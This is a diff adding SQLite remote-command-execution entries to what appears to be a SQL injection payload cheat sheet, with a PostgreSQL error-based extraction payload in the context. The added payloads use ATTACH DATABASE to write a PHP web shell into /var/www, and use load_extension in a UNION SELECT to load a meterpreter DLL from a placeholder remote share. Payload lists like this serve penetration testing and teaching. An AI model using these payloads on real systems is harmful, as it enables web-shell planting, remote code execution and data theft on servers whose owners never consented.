@@ -101,6 +101,21 @@ PostgreSQL Error Based - Basic
 ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
 ```
 
+# SQLite
+Remote Command Execution using SQLite command - Attach Database
+```
+ATTACH DATABASE ‘/var/www/lol.php’ AS lol;
+CREATE TABLE lol.pwn (dataz text);
+INSERT INTO lol.pwn (dataz) VALUES (‘<?system($_GET[‘cmd’]); ?>’);--
+```
+
+Remote Command Execution using SQLite command - Load_extension
+```
+UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
+```
+Note: By default this component is disabled
+
+
 # Other usefull payloads
 
 Polyglot injection (multicontext)
